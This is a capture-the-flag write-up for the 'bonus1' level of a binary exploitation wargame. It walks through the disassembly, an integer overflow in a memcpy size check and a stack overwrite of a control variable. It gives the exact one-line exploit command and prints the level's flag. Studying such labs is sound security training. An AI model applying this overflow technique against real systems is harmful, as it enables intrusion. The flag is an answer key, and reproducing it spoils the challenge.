# Bonus 1


## 🏗️ Binary Analysis

```nasm
08048424 <main>:
 8048424:	55                   	push   %ebp
 8048425:	89 e5                	mov    %esp,%ebp
 8048427:	83 e4 f0             	and    $0xfffffff0,%esp
 804842a:	83 ec 40             	sub    $0x40,%esp
 804842d:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048430:	83 c0 04             	add    $0x4,%eax
 8048433:	8b 00                	mov    (%eax),%eax
 8048435:	89 04 24             	mov    %eax,(%esp)
 8048438:	e8 23 ff ff ff       	call   8048360 <atoi@plt>
 804843d:	89 44 24 3c          	mov    %eax,0x3c(%esp)
 8048441:	83 7c 24 3c 09       	cmpl   $0x9,0x3c(%esp)
 8048446:	7e 07                	jle    804844f <main+0x2b>
 8048448:	b8 01 00 00 00       	mov    $0x1,%eax
 804844d:	eb 54                	jmp    80484a3 <main+0x7f>
 804844f:	8b 44 24 3c          	mov    0x3c(%esp),%eax
 8048453:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
 804845a:	8b 45 0c             	mov    0xc(%ebp),%eax
 804845d:	83 c0 08             	add    $0x8,%eax
 8048460:	8b 00                	mov    (%eax),%eax
 8048462:	89 c2                	mov    %eax,%edx
 8048464:	8d 44 24 14          	lea    0x14(%esp),%eax
 8048468:	89 4c 24 08          	mov    %ecx,0x8(%esp)
 804846c:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048470:	89 04 24             	mov    %eax,(%esp)
 8048473:	e8 a8 fe ff ff       	call   8048320 <memcpy@plt>
 8048478:	81 7c 24 3c 46 4c 4f 	cmpl   $0x574f4c46,0x3c(%esp)
 804847f:	57 
 8048480:	75 1c                	jne    804849e <main+0x7a>
 8048482:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
 8048489:	00 
 804848a:	c7 44 24 04 80 85 04 	movl   $0x8048580,0x4(%esp)
 8048491:	08 
 8048492:	c7 04 24 83 85 04 08 	movl   $0x8048583,(%esp)
 8048499:	e8 b2 fe ff ff       	call   8048350 <execl@plt>
 804849e:	b8 00 00 00 00       	mov    $0x0,%eax
 80484a3:	c9                   	leave  
 80484a4:	c3                   	ret    
 80484a5:	90                   	nop
 80484a6:	90                   	nop
 80484a7:	90                   	nop
 80484a8:	90                   	nop
 80484a9:	90                   	nop
 80484aa:	90                   	nop
 80484ab:	90                   	nop
 80484ac:	90                   	nop
 80484ad:	90                   	nop
 80484ae:	90                   	nop
 80484af:	90                   	nop
```

1. The First Check (jle):The program checks if local_14 <= 9. To bypass this filter and enter the memcpy block, we need to provide a number less than or equal to 9. If we provide a negative number, this condition evaluates to true.

2. The Integer Overflow (memcpy size calculation):The memcpy size is calculated as local_14 * 4.If we pass a very large negative number like -2147483637, the multiplication overflows a 32-bit signed integer and wraps around to an unsigned value of 44. This allows memcpy to copy 44 bytes.

3. The Buffer Overflow (Overwriting Local Variables):The destination buffer local_3c begins at esp + 0x14 and has a length of 40 bytes.The control variable local_14 is located at esp + 0x3c.The exact distance between the start of the buffer and local_14 is:$$0x3c - 0x14 = 0x28 = 40 \text{ bytes}$$

## payload

The hexadecimal value 0x574f4c46 translates directly to the ASCII string FLOW

Each hexadecimal byte corresponds to an ASCII character:

0x57 = W

0x4f = O

0x4c = L

0x46 = F

Due to the processor's endianness, the bytes are reversed which give us 

0x46 = F

0x4c = L

0x4f = O

0x57 = W

./bonus1 -2147483637 $(python -c 'print "_"*40+"FLOW"')


## Flag

579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245